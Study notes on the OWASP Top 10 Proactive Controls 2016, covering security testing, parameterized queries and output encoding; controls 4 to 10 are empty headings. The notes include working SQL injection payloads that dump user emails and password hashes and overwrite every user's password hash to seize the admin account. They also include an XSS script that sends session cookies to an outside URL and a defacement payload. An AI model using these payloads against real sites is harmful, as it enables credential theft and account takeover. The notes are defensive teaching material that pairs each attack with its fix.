# OWASP Proactive Controls 2016

- **OWASP - Open Web Application Security Project**
- The OWASP top ten Proactive Controls is a list of security techniques that should be included in every software development project. They are ordered by order of importance, with control number 1 being the most important.

### What is a Security Control?

- Security Control is a safeguard or countermeasure
- Security controls help avoid, detect, counteract, or minimize security risks
    - To a network admin, a firewall is a Network Security Control
- Application Security Controls help developers write secure code

### What are the OWASP Top 10 Proactive Controls?

- The OWASP Top 10 Proactive Controls are a list of security techniques, listed in order of importance (highest first)
- Document provided in multiple formats
- Released under Creative Commons Attribution ShareAlike 3.0 license

### OWASP Top 10 Proactive Controls

1. C1: Verify for Security Early and Often
2. C2: Parameterize Queries
3. C3: Encode Data
4. C4: Validate All Inputs
5. C5: Implement Identity and Authentication Controls
6. C6: Implement Appropriate Access Controls
7. C7: Protect Data
8. C8: Implement Logging and Intrusion Detection
9. C9: Leverage Security Frameworks and Libraries
10. C10: Error and Exception Handling

### Relation to OWASP Top 10

- The OWASP Top 10 Proactive Controls provide security awareness for developers
- In particular, they relate to the OWASP Top 10 2013 list, OWASP Mobile Top 10 2014 list, and other security threats

### History

- The OWASP Top 10 Proactive Controls list was first created in 2014 -v1
    - Guidance and examples for web apps security best practices
- The list was updated in 2016 - v2 (current)
    - Updated to include more examples, added mobile apps security best practices
- Team Leaders are Katy Anton, Jim Manico, and Jim Bird
- The goas was to:
    - Raise application security awareness for developers
    - Create actionable items to address OWASP Top 10 issues

### For Developers by Developers

- Each OWASP Top 10 Proactive Control provides developers:
    - Description of the security controls
    - Examples in code for several languages and environments
    - Which OWASP Top 10 / Mobile Top 10 and other vulnerabilities are addressed by the security controls
- A list of references, tools and training to check out for more information

[OWASP Proactive Controls](https://owasp.org/www-project-proactive-controls/)

[Introduction](https://owasp.org/www-project-proactive-controls/v3/en/0x04-introduction)

[https://owasp.org/www-pdf-archive/OWASP_Top_10_Proactive_Controls_V2.pdf](https://owasp.org/www-pdf-archive/OWASP_Top_10_Proactive_Controls_V2.pdf)

## Proactive Control 1: Verify for Security Early and Often

- Make security testing an integral part of developer’s software engineering practice
- Consider OWASP ASVS as guide to define security requirements and testing
- Convert scanning output into reusable Proactive Controls to avoid entire classes of problems
- Addresses the following Top 10 Risks:
    - All Top 10 (OWASP Top 10 2013 and OWASP Mobile Top 2014)
    
    ****************The DevOps Challenge to Security****************
    
    - Devops: continuous delivery pipeline
    - Mature DevOps velocity is fast: build, test and deploy can be entirely automated
    - Code is deployed to production multiple times
        - Amazon: deploys every 11.6 seconds
        - Etsy: deploys 25+ times/day
        - [Gov.uk](http://Gov.uk): deploys 30 times/ day
    - Agile/continuous development process can be interrupted during a sprint by security testing

### Automated Security Testing in a Continuous Delivery Pipeline

- An easy approach to include security testing into continuous integration
- Classical/essential security tests can be automated and executed as standard unit/integration tests
- SecDevOps /DevSecOps

### BDD - Security Testing framework

- The BDD-Security framework can be configured using natural language (Given, When & Then format) to describe security requirements, and performs an automated scan for common vulnerabilities.
- Automated (non-)Functional Security testing
- Combine multiple security tools
    - OWASP ZAP, Nessus, Port Scanning, etc

✅**Automated scan for XSS**

```csharp
Scenario: The application should not contain Cross Site Scripting vulnerabilities
Meta: @id scan_xss
Given a fresh scanner with all policies disabled
And the attack strength is set to High
And the Cross-Site-Scripting policy is enabled
When the scanner is run
And false positives described in: tables/false_positives.table are removed
Then no medium or higher risk vulnerabilities should be present
```

✅ ********Automated scan for password policies checks********

```csharp
Scenario: The application should not contain Cross Site Scripting vulnerabilities
Meta : @id auth_case
When the default user logs in with credentials from” users.table
Then the user is logged in
When the case of the password is changed
And the user logs in from a fresh login page
Then the user is no logged in
```

✅ ********************************************Testing Access Control********************************************

The @Restricted annotation is used to tell the framework which users can access which pages

```csharp
@Restricted(users = {"admin"}, sensitiveData = "User List")
public void viewUserList()
{
	driver.get(Config.getInstance().getBaseUrl() + "admin/list");
}
```

OWASP Cheatsheet: [https://cheatsheetseries.owasp.org/IndexTopTen.html](https://cheatsheetseries.owasp.org/IndexTopTen.html)

## Proactive Control 2: Parameterized Queries

- It relates to **SQL injection** which is the most critical of the Top 10
- Verify how parameters are interpreted before executing SQL Query
- Address the following Top 10 Risks
    - A1 - Injection (OWASP Top 10 2013)
    - M1 - Weak Server Side Controls (OWASP Mobile Top 10 2014)

### Anatomy of a SQL Injection Attack

- Developer code uses concatenated strings to create SQL commands

```csharp
string id = "5";
string password = "passw0rd123";
string query = "UPDATE Users SET Password = '" + password + "' WHERE Id = '" + id + "'"
```

- The concatenated string is executed in the database
- If data value is executable code instead of just data, it will be executed, changing the nature and intent of the original SQL command

### The perfect password…

```csharp
X’or’1’=’1’—
```

✔️ Upper

✔️ Lower

✔️ Number

✔️ Special 

✔️ Over 16 characters

### SQL Injection

❌ ********************************Vulnerable Usage********************************

```sql
String password = request.getParameter("password");
String id = request.getParameter("id");
String query = "UPDATE Users SET Password = " + password + " WHERE ID = "+ id;
Statement stmt = connection.createStatement();
```

✅ ************Secure Usage************

```csharp
PreparedStatement pstmt = con.prepareStatement("UPDATE Users SET Password = ? WHERE ID = ?");
pstmt.setString(1, password);
pstmt.setString(2, id);
```

- This will force the password written by user to be treated as values and not as an executable command

Video 8 - Parameterized Queries is explained using a blog website built using Microsoft SQL Server and [ASP.Net](http://ASP.Net) 

********Example - [ASP.NET](http://ASP.NET) wit sql website**

```csharp
#region Bad - Concatenate Strings
sql = "SELECTE * FROM dob.BlogPosts WHERE Post LIKE '%" + searchString +"%'";
var blogPosts = db.BlogPosts.SqlQuery(sql);
#endregion Bad - Concatenate Strings
```

************SQL Injection Problems************

- There is a Input box that takes Post name and allows you to Filter results
- This input box is linked to above SQL code

```csharp
'union all select'1','2','3',--
```

- The above piece of code returned 2 in the list of posts name, so we know 2nd column has the posts name stored
- Using this information we can do

```csharp
'union all select'1',@@version,'3',--
```

- This returns the version of the SQL Sever used to the hacker
- With the information that we are using Microsoft SQL Server and [ASP.Net](http://ASP.Net) they can tell it uses MVC structure, and try to do the following

```csharp
'union select '1',id+':'+email+':'+passwordhash,Id as UserId from AspNetUsers; --
```

- It returns the following data

```csharp
User                       Post
roberthurlbut@test.com     7222a1664-a737-458a-aaee-c379b51e8b4c : roberthulbut@test.com
                           AM8ORa2EQ5bILLrS0sjPW5IJ2vSrdQaHzLs9UCcrIQ6b46z93Xr8rag6B8qthrcXA==

roberthurlbut@test.com     7222a1664-a737-458a-aaee-c379b51e8b4c : roberthulbut@test.com
                           AM8ORa2EQ5bILLrS0sjPW5IJ2vSrdQaHzLs9UCcrIQ6b46z93Xr8rag6B8qthrcXA==

roberthurlbut@test.com     Google

roberthurlbut@test.com     This is a test

admin@test.com             Hello world!
```

```csharp
';update AspNetUsers set PasswordHash="AM8ORa2EQ5bILLrS0sjPW5IJ2vSrdQaHzLs9UCcrIQ6b46z93Xr8rag6B8qthrcXA==",--
```

- This will update passwords of all the users in the table
- Since blog tells me the email of other users
- Now I can login as admin using my password and change their blog
- Which after I have done will be like

```csharp
UserName                   Post

roberthurlbut@test.com     Google

roberthurlbut@test.com     This is a test

admin@test.com             Hello world! I have taken over
```

- These are some of the examples that can happen with one sql injection problem in the website

```csharp
#region Better - Use Parameters
sql = "SELECT * FROM dbo/BlogPosts WHERE Post LIKE @p";
List<object> parameters = new List<object>();
parameters.Add(new SqlParameter("p", searchString));
var blogPosts = db.BlogPosts.SqlQuery(sql, parameters.ToArray());
#endregion Better - Use Parameters
```

- Now the data written by user in input box will ********************************not go in as an executable query******************************** but rather as a string which will be compared within the post and return any results that match

```csharp
#Another way to fix the sql injection issue in DotNet
#region Better - Use LINQ
var blogPosts = db.BlogPosts.Include(b => b.User).Where(p => p.Post.Contains(searchString));
#endregion Better - Use LINQ
```

## Proactive Control 3: Encode Data

- Any time you accept data from the user on a web page it has the potential to be executed as script on the web page
- If you put the data in a script tag and submit it then it is treated as executable code
- Attacker can have access to a cookie or it could make calls out to other sites if some restrictions aren’t in place or it can deface your web site.

- Encode data before use in a parser (JS, CSS, XML)
- Addresses the following Top 10 Risks:
    - A1 - Injection (in part) (OWASP Top 10 2013)
    - A3 - Cross Site Scripting (XSS) (in part) (OWASP Top 10 2013)
    - M7 - Client Side Injection (OWASP Top 10 2014)

### Anatomy of a XSS attack

🎯 **************Attack1: cookie theft**************

```jsx
<script>
var badURL='https://owasp.org/somesite/data=' + document.cookie;
var img = new Image();
img.src = barURL;
</script>
```

🎯 **************Attack2: Web site defacement**************

```jsx
<script>document.body.innerHTML='<blink>GO OWASP</blink>'</script>
```

❌ **The Problem**

- Web page vulnerable to XSS

✅ ****************The Solution****************

- OWASP Java Encoder Project
- OWASP Java HTML Sanitizer Project
- Microsoft Encoder and AntiXSS Library

********Microsoft Encoder and AntiXSS Library********

- System.Web.Security.AntiXSS
- Microsoft.Security.Application.AnitXSS
- Can encode for HTML, HTML attributes, XML, CSS and Javascript
- Native .NET Library
- Very powerful well written library
- For use in your User Interface code to defuse script in output

****************************OWASP Java Encoder Project****************************

- No third party libraries or configuration necessary
- This code was designed for high-availability/high performance encoding functionality
- Simple drop-in encoding functionality
- Redesigned for performance
- More complete API (URI and URI component encoding, etc) in some regards

********Other Resources********

- LDAP Encoding Functions
    - ESAPI and .NET AntiXSS
- Command Injection Encoding Functions
    - ESAPI
- XML Encoding Functions
    - OWASP Java Encoder
- Encoder comparison reference
    - [http://boldersecurity.github.io/encoder-comparison-reference/](http://boldersecurity.github.io/encoder-comparison-reference/)

******XSS Problems******

- Typing script in the post input of the Blog site

```jsx
Google<a
href="https://google.come">Google</a>
```

- Error is given by the [ASP.Net](http://ASP.Net) website as the course instructor has used some built-in xss detection given in razor pages and prevention using a blacklist
- There is a way to allow html code to be saved inside a blog post in dotnet.

```jsx
[AllowHTML]
```

- AllowHTML should be added in the BlogModel
- This will slow HTML to be saved in the database

```csharp
@HTML.DisplayFor(modelItem => item.Post)
DisplayFor returns HTML that is encoded 

@*@HTML.Raw(item.Post)*@
This returns HTML that is not encoded
```

## Proactive Control 4: Validate Inputs

## Proactive Control 5: Identity and Authentication

## Proactive Control 6: Implement Access Controls

## Proactive Control 7: Protect Data

## Proactive Control 8: Logging and Intrusion Detection

## Proactive Control 9: Security Frameworks

## Proactive Control 10: Exception Handling
